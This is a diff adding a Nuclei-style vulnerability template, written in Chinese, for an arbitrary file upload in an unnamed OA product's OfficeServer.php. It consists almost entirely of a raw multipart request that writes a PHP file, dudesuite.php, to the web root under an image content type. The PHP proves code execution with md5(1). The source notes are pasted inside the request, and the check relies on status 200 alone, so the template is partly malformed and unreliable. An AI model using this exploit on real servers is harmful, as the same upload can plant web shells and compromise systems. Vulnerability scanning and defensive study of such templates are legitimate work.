@@ -1,0 +1,69 @@
+id: poc-yq5hdmc1ng9122p2
+info:
+  name: 某未知OA文件上传漏洞A
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yq5hdmc1ng9122p2'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yq5hdmc1ng9122p2
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /static/lib/weboffice/js/OfficeServer.php HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----------398jnjVTTlDVXHlE7yYnfwBoix
+
+
+
+
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+
+
+    Content-Disposition: form-data; name="FormData"
+
+
+
+
+    {"OPTION":"SAVEFILE","FILEPATH":"/dudesuite.php"}
+
+
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+
+
+    Content-Disposition: form-data; name="FileData"; filename="dudesuite.php"
+
+
+    Content-Type: image/jpg
+
+
+
+
+
+
+    <?php echo md5(1);?>
+
+
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
